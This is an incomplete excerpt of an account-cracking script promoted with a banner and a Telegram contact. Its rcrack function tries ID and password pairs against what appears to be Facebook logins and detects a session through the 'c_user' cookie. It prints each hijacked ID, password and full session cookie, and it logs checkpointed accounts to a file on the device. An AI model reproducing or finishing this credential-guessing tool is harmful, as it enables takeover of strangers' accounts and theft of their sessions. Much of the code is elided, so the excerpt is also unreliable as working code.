...
#mg CHNNAL :  https://m.me/j/AbaOKkwk-0oSp3My/
#OWNER : WASIM 360 1N
#TEAM : TEAM BOT HACKERS 
# -----------------[ WASIM 360 ]-------------------#
...
ha = current.day
today = date.today()
os.system('espeak -a 300 " install complete   welcome. wasim. random.ok. id. tool"')
...
\033[0;32m╚███╔███╔╝██║  ██║███████║██║██║ ╚═╝ ██║
 \033[0;32m╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝     ╚═╝
 \033[0;34m_____________________________________\033[0;32m
𝐃𝐄𝐕𝐎𝐋𝐏𝐄𝐑   ⚡ 𝐖𝐀𝐒𝐈𝐌 𝐁𝐑𝐎
𝐘𝐎𝐔𝐓𝐔𝐁     ⚡ 𝐖𝐀𝐒𝐈𝐌 𝟑𝟔𝟎
𝐓𝐎𝐎𝐋       ⚡ 𝐖𝐀𝐒𝐈𝐌 𝐑𝐀𝐍𝐃𝐎𝐌 𝐎𝐊 𝐈𝐃
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌   ⚡ @𝐰𝐚𝐬𝐢𝐦_𝐛𝐫𝐨
________________________________________________
""")

def shoha():
	print(" \033[36;1mWASIM 360 TOOL")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                os.system('espeak -a 300 " WASIM OK ID"')
                print('\r\r\033[1;32m [WASIM-OK] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCOOKIE= \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [WASIM-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/WASIM 360 -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr} WASIM BRO {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
